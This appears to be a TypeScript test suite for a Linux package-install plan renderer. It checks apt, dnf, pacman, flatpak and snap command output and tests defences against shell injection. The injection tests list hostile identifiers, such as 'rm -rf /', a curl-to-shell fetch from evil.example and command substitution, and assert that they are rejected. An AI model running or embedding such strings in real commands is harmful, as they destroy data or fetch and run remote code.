import assert from 'node:assert/strict';
import { test } from 'node:test';
import { APPLICATIONS, createEnvironment, findApplication } from '@configshell/catalog';
import type { Application, Environment } from '@configshell/catalog';
import { UnsafeIdentifierError, renderPlan, safeBinary, safeIdentifier } from './commands.ts';
import { buildPlan } from './plan.ts';
import { resolveAll } from './resolve.ts';

const UBUNTU = createEnvironment('Ubuntu');
const FEDORA = createEnvironment('Fedora');
const ARCH = createEnvironment('Arch Linux');

function app(id: string): Application {
  const entry = findApplication(id);
  assert.ok(entry, `catalog is missing ${id}`);
  return entry;
}

function render(ids: string[], environment: Environment) {
  return renderPlan(buildPlan(resolveAll(ids.map(app), environment), environment));
}

function commands(ids: string[], environment: Environment): string[] {
  return render(ids, environment).commands.map((c) => c.command);
}

// ------------------------------------------------------------ golden output

test('APT: refresh then a single install, no auto-confirm flag', () => {
  assert.deepEqual(commands(['git', 'htop'], UBUNTU), [
    'sudo apt-get update',
    'sudo apt-get install git htop',
    'command -v git',
    'command -v htop',
  ]);
});

test('DNF: install directly, since dnf refreshes its own metadata', () => {
  assert.deepEqual(commands(['git', 'htop'], FEDORA), [
    'sudo dnf install git htop',
    'command -v git',
    'command -v htop',
  ]);
});

test('pacman: -Syu --needed, never a bare -Sy followed by -S', () => {
  const rendered = commands(['git', 'htop'], ARCH);
  assert.deepEqual(rendered, [
    'sudo pacman -Syu --needed git htop',
    'command -v git',
    'command -v htop',
  ]);
  assert.ok(
    !rendered.some((c) => /pacman -Sy(?!u)/.test(c)),
    'a bare -Sy would create a partial-upgrade state',
  );
});

test('Flatpak is installed per-user, so it needs no sudo', () => {
  const rendered = render(['google-chrome'], UBUNTU);
  assert.deepEqual(
    rendered.commands.map((c) => c.command),
    ['flatpak install --user flathub com.google.Chrome'],
  );
  assert.equal(rendered.privilegedCount, 0);
});

test('Snap installs are privileged and batched', () => {
  const rendered = render(['postman', 'zoom'], UBUNTU);
  const snap = rendered.commands.find((c) => c.command.startsWith('sudo snap'));
  assert.ok(snap);
  assert.equal(snap.privileged, true);
  assert.match(snap.command, /^sudo snap install [\w.-]+( [\w.-]+)*$/);
});

test('no generated command carries -y or --noconfirm', () => {
  // ConfigShell's plan review is one confirmation; the package manager's own
  // prompt is a second, and it costs nothing to keep.
  for (const environment of [UBUNTU, FEDORA, ARCH]) {
    for (const command of renderPlan(
      buildPlan(resolveAll(APPLICATIONS, environment), environment),
    ).commands) {
      assert.ok(
        !/(^|\s)(-y|--yes|--noconfirm|--assume-yes)(\s|$)/.test(command.command),
        `auto-confirm flag in: ${command.command}`,
      );
    }
  }
});

// --------------------------------------------------------- manual & failure

test('manual steps produce no command, and survive rendering', () => {
  const rendered = render(['git', 'cursor'], UBUNTU);
  assert.equal(rendered.manualSteps.length, 1);
  assert.equal(rendered.manualSteps[0]!.applicationId, 'cursor');
  assert.ok(
    !rendered.commands.some((c) => c.command.includes('cursor')),
    'a manual step must never be turned into a command',
  );
});

test('privilege is reported per command and counted', () => {
  const rendered = render(['git', 'google-chrome'], UBUNTU);
  for (const c of rendered.commands) {
    assert.equal(c.privileged, c.command.startsWith('sudo '));
  }
  assert.equal(
    rendered.privilegedCount,
    rendered.commands.filter((c) => c.command.startsWith('sudo ')).length,
  );
});

test('every rendered command carries a summary a user can read first', () => {
  for (const c of render(['git', 'postman'], UBUNTU).commands) {
    assert.ok(c.summary.length > 0, c.command);
  }
});

// -------------------------------------------------------- injection defence

const HOSTILE = [
  'git; rm -rf /',
  'git && curl http://evil.example/x | sh',
  'git | sh',
  '$(whoami)',
  '`id`',
  'git\nrm -rf /',
  'git\trm',
  '--force',
  '-rf',
  '../../../bin/sh',
  'a b',
  "git'",
  'git"',
  'git>out',
  'git<in',
  'git&',
  'git*',
  '',
  '  ',
];

test('a hostile identifier cannot reach a command string', () => {
  for (const identifier of HOSTILE) {
    assert.throws(
      () => safeIdentifier(identifier),
      UnsafeIdentifierError,
      `accepted hostile identifier: ${JSON.stringify(identifier)}`,
    );
  }
});

test('a hostile verification binary cannot reach a command string', () => {
  for (const binary of HOSTILE) {
    assert.throws(
      () => safeBinary(binary),
      UnsafeIdentifierError,
      `accepted hostile binary: ${JSON.stringify(binary)}`,
    );
  }
});

test('rendering a hostile catalog entry throws instead of emitting a command', () => {
  const malicious: Application = {
    id: 'malicious',
    name: 'Malicious',
    description: 'A catalog entry that tries to inject a shell command.',
    category: 'General',
    homepage: 'https://example.com',
    installation: [
      {
        method: 'apt',
        identifier: 'evil; curl http://evil.example/x | sh',
        origin: 'distro',
        distros: ['Ubuntu'],
      },
    ],
    verify: { binary: 'evil; id' },
  };
  const plan = buildPlan(resolveAll([malicious], UBUNTU), UBUNTU);
  assert.throws(() => renderPlan(plan), UnsafeIdentifierError);
});

test('real catalog identifiers all pass the strict pattern', () => {
  for (const entry of APPLICATIONS) {
    for (const source of entry.installation) {
      assert.doesNotThrow(() => safeIdentifier(source.identifier), `${entry.id}: ${source.identifier}`);
    }
    if (entry.verify) {
      assert.doesNotThrow(() => safeBinary(entry.verify!.binary), entry.id);
    }
  }
});

test('no generated command contains a shell metacharacter', () => {
  // The property `docs/security-model.md` claims, asserted rather than assumed.
  for (const environment of [UBUNTU, createEnvironment('Debian'), FEDORA, ARCH]) {
    const rendered = renderPlan(buildPlan(resolveAll(APPLICATIONS, environment), environment));
    for (const { command } of rendered.commands) {
      assert.ok(
        !/[;&|`$(){}<>\\'"*?!~\n\r\t]/.test(command),
        `${environment.distro}: metacharacter in ${JSON.stringify(command)}`,
      );
      assert.match(command, /^[A-Za-z0-9 _.+-]+$/, `unexpected characters in ${command}`);
    }
  }
});

test('verification is generated from one fixed template, never per-application text', () => {
  for (const environment of [UBUNTU, FEDORA, ARCH]) {
    const rendered = renderPlan(buildPlan(resolveAll(APPLICATIONS, environment), environment));
    for (const c of rendered.commands.filter((c) => c.stepKind === 'verify')) {
      assert.match(c.command, /^command -v [A-Za-z0-9][A-Za-z0-9._+-]*$/);
      assert.equal(c.privileged, false);
    }
  }
});

test('rendering is deterministic', () => {
  const ids = ['git', 'vlc', 'cursor', 'postman'];
  assert.deepEqual(commands(ids, UBUNTU), commands(ids, UBUNTU));
});

test('an empty plan renders to no commands rather than an error', () => {
  const rendered = renderPlan(buildPlan([], UBUNTU));
  assert.deepEqual(rendered.commands, []);
  assert.equal(rendered.privilegedCount, 0);
});

test('a step note travels with its own command and no other', () => {
  // The Flathub precondition belongs to the Flatpak step. Attaching it to the
  // APT command would tell a user to configure a remote they do not need.
  const rendered = render(['git', 'google-chrome'], UBUNTU);

  const flatpak = rendered.commands.find((c) => c.command.startsWith('flatpak'));
  assert.ok(flatpak);
  assert.match(flatpak.note ?? '', /Flathub remote/);

  for (const command of rendered.commands) {
    if (command.command.startsWith('flatpak')) continue;
    assert.equal(command.note, undefined, `unexpected note on: ${command.command}`);
  }
});

test('each verification command names the application it checks', () => {
  const rendered = render(['git', 'htop'], UBUNTU);
  const checks = rendered.commands.filter((c) => c.stepKind === 'verify');
  assert.equal(checks.length, 2);
  assert.deepEqual(
    checks.map((c) => c.summary),
    ['Check Git is installed', 'Check htop is installed'],
  );
});
